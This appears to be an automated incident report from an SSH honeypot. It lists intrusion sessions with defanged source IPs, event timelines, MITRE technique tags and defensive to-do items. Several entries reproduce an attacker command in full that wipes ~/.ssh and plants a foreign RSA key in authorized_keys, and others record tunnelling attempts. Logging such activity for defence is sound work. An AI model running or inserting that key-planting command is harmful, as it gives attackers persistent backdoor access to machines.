| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:20:50` | `cowrie.session.connect` |
| `2026-07-04 16:20:50` | `cowrie.client.version` |
| `2026-07-04 16:20:50` | `cowrie.client.kex` |
| `2026-07-04 16:20:51` | `cowrie.login.success` |
| `2026-07-04 16:20:52` | `cowrie.session.params` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.success` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.command.input` |
| `2026-07-04 16:20:52` | `cowrie.log.closed` |
| `2026-07-04 16:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f958ff7f6149

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]158` |
| **First Seen** | 2026-07-04 16:22 |
| **Last Seen** | 2026-07-04 16:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:22:54` | `cowrie.session.connect` |
| `2026-07-04 16:22:54` | `cowrie.client.version` |
| `2026-07-04 16:22:55` | `cowrie.client.kex` |
| `2026-07-04 16:22:56` | `cowrie.login.success` |
| `2026-07-04 16:22:57` | `cowrie.session.params` |
| `2026-07-04 16:22:57` | `cowrie.command.input` |
| `2026-07-04 16:22:57` | `cowrie.command.failed` |
| `2026-07-04 16:22:58` | `cowrie.log.closed` |
| `2026-07-04 16:22:59` | `cowrie.session.params` |
| `2026-07-04 16:22:59` | `cowrie.command.input` |
| `2026-07-04 16:22:59` | `cowrie.session.file_download` |
| `2026-07-04 16:22:59` | `cowrie.log.closed` |
| `2026-07-04 16:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]158` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca238ae48ce5

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]158` |
| **First Seen** | 2026-07-04 16:22 |
| **Last Seen** | 2026-07-04 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:22:59` | `cowrie.session.connect` |
| `2026-07-04 16:22:59` | `cowrie.client.version` |
| `2026-07-04 16:22:59` | `cowrie.client.kex` |
| `2026-07-04 16:23:00` | `cowrie.login.success` |
| `2026-07-04 16:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]158` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644c6a9d3aa1

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]158` |
| **First Seen** | 2026-07-04 16:23 |
| **Last Seen** | 2026-07-04 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:23:01` | `cowrie.session.connect` |
| `2026-07-04 16:23:01` | `cowrie.client.version` |
| `2026-07-04 16:23:01` | `cowrie.client.kex` |
| `2026-07-04 16:23:02` | `cowrie.login.success` |
| `2026-07-04 16:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]158` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf35f2d82cf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:24 |
| **Last Seen** | 2026-07-04 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:24:05` | `cowrie.session.connect` |
| `2026-07-04 16:24:05` | `cowrie.client.version` |
| `2026-07-04 16:24:05` | `cowrie.client.kex` |
| `2026-07-04 16:24:05` | `cowrie.login.success` |
| `2026-07-04 16:24:05` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:24:06` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6680bfc33c

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-04 16:24 |
| **Last Seen** | 2026-07-04 16:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:24:15` | `cowrie.session.connect` |
| `2026-07-04 16:24:15` | `cowrie.client.version` |
| `2026-07-04 16:24:15` | `cowrie.client.kex` |
| `2026-07-04 16:24:17` | `cowrie.login.success` |
| `2026-07-04 16:24:18` | `cowrie.session.params` |
| `2026-07-04 16:24:18` | `cowrie.command.input` |
| `2026-07-04 16:24:18` | `cowrie.command.failed` |
| `2026-07-04 16:24:18` | `cowrie.log.closed` |
| `2026-07-04 16:24:19` | `cowrie.session.params` |
| `2026-07-04 16:24:19` | `cowrie.command.input` |
| `2026-07-04 16:24:20` | `cowrie.session.file_download` |
| `2026-07-04 16:24:20` | `cowrie.log.closed` |
| `2026-07-04 16:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1d03a96d3e2

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-04 16:24 |
| **Last Seen** | 2026-07-04 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:24:20` | `cowrie.session.connect` |
| `2026-07-04 16:24:20` | `cowrie.client.version` |
| `2026-07-04 16:24:20` | `cowrie.client.kex` |
| `2026-07-04 16:24:21` | `cowrie.login.success` |
| `2026-07-04 16:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24edaf114913

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-04 16:24 |
| **Last Seen** | 2026-07-04 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:24:22` | `cowrie.session.connect` |
| `2026-07-04 16:24:22` | `cowrie.client.version` |
| `2026-07-04 16:24:22` | `cowrie.client.kex` |
| `2026-07-04 16:24:24` | `cowrie.login.success` |
| `2026-07-04 16:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d19791b4da0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 16:25 |
| **Last Seen** | 2026-07-04 16:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:25:09` | `cowrie.session.connect` |
| `2026-07-04 16:25:10` | `cowrie.client.version` |
| `2026-07-04 16:25:10` | `cowrie.client.kex` |
| `2026-07-04 16:25:16` | `cowrie.login.success` |
| `2026-07-04 16:25:20` | `cowrie.session.params` |
| `2026-07-04 16:25:20` | `cowrie.command.input` |
| `2026-07-04 16:25:21` | `cowrie.log.closed` |
| `2026-07-04 16:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c7f401dc13

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-04 16:26 |
| **Last Seen** | 2026-07-04 16:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:26:28` | `cowrie.session.connect` |
| `2026-07-04 16:26:28` | `cowrie.client.version` |
| `2026-07-04 16:26:28` | `cowrie.client.kex` |
| `2026-07-04 16:26:29` | `cowrie.login.success` |
| `2026-07-04 16:26:30` | `cowrie.session.params` |
| `2026-07-04 16:26:30` | `cowrie.command.input` |
| `2026-07-04 16:26:30` | `cowrie.command.failed` |
| `2026-07-04 16:26:30` | `cowrie.log.closed` |
| `2026-07-04 16:26:31` | `cowrie.session.params` |
| `2026-07-04 16:26:31` | `cowrie.command.input` |
| `2026-07-04 16:26:31` | `cowrie.session.file_download` |
| `2026-07-04 16:26:31` | `cowrie.log.closed` |
| `2026-07-04 16:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74bfab88e5be

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-04 16:26 |
| **Last Seen** | 2026-07-04 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:26:32` | `cowrie.session.connect` |
| `2026-07-04 16:26:32` | `cowrie.client.version` |
| `2026-07-04 16:26:32` | `cowrie.client.kex` |
| `2026-07-04 16:26:33` | `cowrie.login.success` |
| `2026-07-04 16:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3565ca97480f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-04 16:26 |
| **Last Seen** | 2026-07-04 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:26:33` | `cowrie.session.connect` |
| `2026-07-04 16:26:33` | `cowrie.client.version` |
| `2026-07-04 16:26:33` | `cowrie.client.kex` |
| `2026-07-04 16:26:34` | `cowrie.login.success` |
| `2026-07-04 16:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544853cc8952

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:26 |
| **Last Seen** | 2026-07-04 16:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:26:42` | `cowrie.session.connect` |
| `2026-07-04 16:26:42` | `cowrie.client.version` |
| `2026-07-04 16:26:42` | `cowrie.client.kex` |
| `2026-07-04 16:26:43` | `cowrie.login.success` |
| `2026-07-04 16:26:43` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:26:43` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f778b821ca6

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 16:27 |
| **Last Seen** | 2026-07-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:27:42` | `cowrie.session.connect` |
| `2026-07-04 16:27:42` | `cowrie.client.version` |
| `2026-07-04 16:27:42` | `cowrie.client.kex` |
| `2026-07-04 16:27:43` | `cowrie.login.success` |
| `2026-07-04 16:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e814b38033f5

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 16:27 |
| **Last Seen** | 2026-07-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:27:42` | `cowrie.session.connect` |
| `2026-07-04 16:27:42` | `cowrie.client.version` |
| `2026-07-04 16:27:42` | `cowrie.client.kex` |
| `2026-07-04 16:27:43` | `cowrie.login.success` |
| `2026-07-04 16:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b74c1c1703d

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 16:27 |
| **Last Seen** | 2026-07-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:27:47` | `cowrie.session.connect` |
| `2026-07-04 16:27:47` | `cowrie.client.version` |
| `2026-07-04 16:27:47` | `cowrie.client.kex` |
| `2026-07-04 16:27:48` | `cowrie.login.success` |
| `2026-07-04 16:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c051771a492

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 16:27 |
| **Last Seen** | 2026-07-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:27:49` | `cowrie.session.connect` |
| `2026-07-04 16:27:49` | `cowrie.client.version` |
| `2026-07-04 16:27:49` | `cowrie.client.kex` |
| `2026-07-04 16:27:50` | `cowrie.login.success` |
| `2026-07-04 16:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f525b443969d

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-07-04 16:28 |
| **Last Seen** | 2026-07-04 16:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:28:04` | `cowrie.session.connect` |
| `2026-07-04 16:28:04` | `cowrie.client.version` |
| `2026-07-04 16:28:04` | `cowrie.client.kex` |
| `2026-07-04 16:28:05` | `cowrie.login.success` |
| `2026-07-04 16:28:06` | `cowrie.session.params` |
| `2026-07-04 16:28:06` | `cowrie.command.input` |
| `2026-07-04 16:28:06` | `cowrie.command.failed` |
| `2026-07-04 16:28:06` | `cowrie.log.closed` |
| `2026-07-04 16:28:07` | `cowrie.session.params` |
| `2026-07-04 16:28:07` | `cowrie.command.input` |
| `2026-07-04 16:28:07` | `cowrie.session.file_download` |
| `2026-07-04 16:28:07` | `cowrie.log.closed` |
| `2026-07-04 16:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f728c909274c

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-07-04 16:28 |
| **Last Seen** | 2026-07-04 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:28:08` | `cowrie.session.connect` |
| `2026-07-04 16:28:08` | `cowrie.client.version` |
| `2026-07-04 16:28:08` | `cowrie.client.kex` |
| `2026-07-04 16:28:09` | `cowrie.login.success` |
| `2026-07-04 16:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1976ba78a4

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-07-04 16:28 |
| **Last Seen** | 2026-07-04 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:28:09` | `cowrie.session.connect` |
| `2026-07-04 16:28:09` | `cowrie.client.version` |
| `2026-07-04 16:28:10` | `cowrie.client.kex` |
| `2026-07-04 16:28:11` | `cowrie.login.success` |
| `2026-07-04 16:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d2086b1418

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 16:28 |
| **Last Seen** | 2026-07-04 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:28:11` | `cowrie.session.connect` |
| `2026-07-04 16:28:11` | `cowrie.client.version` |
| `2026-07-04 16:28:11` | `cowrie.client.kex` |
| `2026-07-04 16:28:12` | `cowrie.login.success` |
| `2026-07-04 16:28:12` | `cowrie.session.params` |
| `2026-07-04 16:28:12` | `cowrie.command.input` |
| `2026-07-04 16:28:12` | `cowrie.log.closed` |
| `2026-07-04 16:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76519c44bad9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:29 |
| **Last Seen** | 2026-07-04 16:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:29:12` | `cowrie.session.connect` |
| `2026-07-04 16:29:12` | `cowrie.client.version` |
| `2026-07-04 16:29:12` | `cowrie.client.kex` |
| `2026-07-04 16:29:12` | `cowrie.login.success` |
| `2026-07-04 16:29:13` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:29:13` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72bdd2c3228d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:31 |
| **Last Seen** | 2026-07-04 16:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:31:31` | `cowrie.session.connect` |
| `2026-07-04 16:31:31` | `cowrie.client.version` |
| `2026-07-04 16:31:31` | `cowrie.client.kex` |
| `2026-07-04 16:31:32` | `cowrie.login.success` |
| `2026-07-04 16:31:32` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:31:32` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5ecee0fe62

